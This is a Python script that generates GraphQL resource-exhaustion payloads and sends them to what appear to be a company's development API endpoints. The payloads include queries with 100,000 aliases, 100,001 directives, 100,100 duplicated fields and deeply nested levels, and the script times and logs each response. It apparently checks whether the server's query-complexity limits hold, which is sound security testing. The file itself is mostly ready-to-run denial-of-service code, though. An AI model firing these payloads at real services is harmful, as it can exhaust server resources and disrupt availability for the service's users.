import time
import requests
from concurrent.futures import ThreadPoolExecutor
import os
from datetime import datetime

GRAPHQL_ENDPOINT = "https://foxden-dev.api.foxquilt.com/underwriting/2022-06-30/graphql"
# GRAPHQL_ENDPOINT = "https://foxden-dev.api.foxquilt.com/ratingquoting/2022-06-30/graphql"
# GRAPHQL_ENDPOINT = "https://foxden-dev.api.foxquilt.com/foxden-payment-v2/2022-06-30/public-graphql"
REFERER = "https://join-dev.foxquilt.com/"
ORIGIN = "https://join-dev.foxquilt.com"

# GRAPHQL_ENDPOINT = "http://localhost:4002/local/2022-06-30/graphql"
# REFERER = "http://localhost:4002/"
# ORIGIN = "http://localhost:4002"

def generate_alias_overloading_query(n_aliases=100):
  aliases = "\n".join([
    f"alias{i}: __typename"
    for i in range(n_aliases)
  ])

  query = f"""query {{
{aliases}
}}"""
  return query

def generate_directive_overloading_query(m_directives=10000):
    directives = " ".join([f"@boom" for _ in range(m_directives)])
    query = f"""query {{
 __typename {directives}
}}"""
    return query

def generate_field_duplication_query(n_fields=100):
    fields = "\n".join(["__typename" for _ in range(n_fields)])
    query = f"""query {{
{fields}
}}"""
    return query

def generate_deep_query(depth=10):
    query = "query {\n"
    for i in range(depth):
        query += "  " * i + f"level{i} {{\n"
    query += "  " * depth + "__typename\n"
    for i in range(depth):
        query += "  " * (depth - i - 1) + "}\n"
    query += "}"
    return query

def send_graphql_request(query):
  headers = {
    "Content-Type": "application/json",
    "Referer": REFERER,
    "Origin": ORIGIN
  }
  payload = {
    "query": query,
  }
  start_time = time.time() # Start measuring time
  response = requests.post(GRAPHQL_ENDPOINT, json=payload, headers=headers)
  elapsed_time = time.time() - start_time # End measuring time
  return response, elapsed_time


def main():
  # Create assets folder if it doesn't exist
  os.makedirs('assets', exist_ok=True)
  timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
  log_filename = f"assets/one_attack_{timestamp}.txt"
  log_file = open(log_filename, 'w')

  def log(msg):
    print(msg)
    log_file.write(msg + '\n')

  log(f"--- STARTS AT {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} TO {GRAPHQL_ENDPOINT} ---")

  # 1) Directive
  m_directives_1 = 51
  log(f"[*] Sending Directive Query with {m_directives_1} directives...")
  directive_query = generate_directive_overloading_query(m_directives=m_directives_1)
  log("Directive Query: " + directive_query[:300] + "...") # Truncate for readability
  resp_directive, time_directive = send_graphql_request(directive_query)
  log("Status Code: " + str(resp_directive.status_code))
  log("Response: " + resp_directive.text[:300] + "...") # Truncate for readability
  log(f"Time Taken (Directive Query): {time_directive:.4f} seconds\n")

  # 2) Directive Overloading
  m_directives_2 = 100001
  log(f"[*] Sending Directive Query with {m_directives_2} directives...")
  directive_query = generate_directive_overloading_query(m_directives=m_directives_2)
  log("Directive Query: " + directive_query[:300] + "...") # Truncate for readability
  resp_directive, time_directive = send_graphql_request(directive_query)
  log("Status Code: " + str(resp_directive.status_code))
  log("Response: " + resp_directive.text[:300] + "...") # Truncate for readability
  log(f"Time Taken (Directive Query): {time_directive:.4f} seconds\n")

  # 3) Alias Overloading (blockers)
  n_aliases_1 = 21
  log(f"[*] Sending Alias Overloading Query with {n_aliases_1} aliases...")
  alias_query = generate_alias_overloading_query(n_aliases_1)
  log("Alias Query: " + alias_query[:300] + "...") # Truncate for readability
  resp_alias, time_alias = send_graphql_request(alias_query)
  log("Status Code: " + str(resp_alias.status_code))
  log("Response: " + resp_alias.text[:300] + "...") # Truncate for readability
  log(f"Time Taken (Alias Overload): {time_alias:.4f} seconds\n")

  # 4) Alias Overloading
  n_aliases_2 = 100000
  log(f"[*] Sending Alias Overloading Query with {n_aliases_2} aliases...")
  alias_query = generate_alias_overloading_query(n_aliases=n_aliases_2)
  log("Alias Query: " + alias_query[:300] + "...") # Truncate for readability
  resp_alias, time_alias = send_graphql_request(alias_query)
  log("Status Code: " + str(resp_alias.status_code))
  log("Response: " + resp_alias.text[:300] + "...") # Truncate for readability
  log(f"Time Taken (Alias Overload): {time_alias:.4f} seconds\n")

  # 5) Field Duplication (blockers)
  # n_fields_1 = 50
  # log(f"[*] Sending Field Duplication Query with {n_fields_1} fields...")
  # field_dup_query = generate_field_duplication_query(n_fields=n_fields_1)
  # log("Field Duplication Query: " + field_dup_query[:300] + "...") # Truncate for readability
  # resp_field_dup, time_field_dup = send_graphql_request(field_dup_query)
  # log("Status Code: " + str(resp_field_dup.status_code))
  # log("Response: " + resp_field_dup.text[:300] + "...") # Truncate for readability
  # log(f"Time Taken (Field Duplication): {time_field_dup:.4f} seconds\n")

  # 6) Field Duplication
  n_fields_2 = 100100
  log(f"[*] Sending Field Duplication Query with {n_fields_2} fields...")
  field_dup_query = generate_field_duplication_query(n_fields=n_fields_2)
  log("Field Duplication Query: " + field_dup_query[:300] + "...") # Truncate for readability
  resp_field_dup, time_field_dup = send_graphql_request(field_dup_query)
  log("Status Code: " + str(resp_field_dup.status_code))
  log("Response: " + resp_field_dup.text[:300] + "...") # Truncate for readability
  log(f"Time Taken (Field Duplication): {time_field_dup:.4f} seconds\n")

  # # 7) Deep Query depth = 10
  # depth_1 = 10
  # log(f"[*] Sending Deep Query depth {depth_1}...")
  # deep_query = generate_deep_query(depth_1)
  # log("Deep Query: " + deep_query[:300] + "...") # Truncate for readability
  # resp_deep, time_deep = send_graphql_request(deep_query)
  # log("Status Code: " + str(resp_deep.status_code))
  # log("Response: " + resp_deep.text[:300] + "...") # Truncate for readability
  # log(f"Time Taken (Deep Query): {time_deep:.4f} seconds\n")

  # # 8) Deep Query depth = 100000
  # depth_2 = 100000
  # log(f"[*] Sending Deep Query depth {depth_2}...")
  # deep_query = generate_deep_query(depth_2)
  # log("Deep Query: " + deep_query[:300] + "...") # Truncate for readability
  # resp_deep, time_deep = send_graphql_request(deep_query)
  # log("Status Code: " + str(resp_deep.status_code))
  # log("Response: " + resp_deep.text[:300] + "...") # Truncate for readability
  # log(f"Time Taken (Deep Query): {time_deep:.4f} seconds\n")

  log(f"--- ENDS ---")

  log_file.close()

if __name__ == "__main__":
  main()


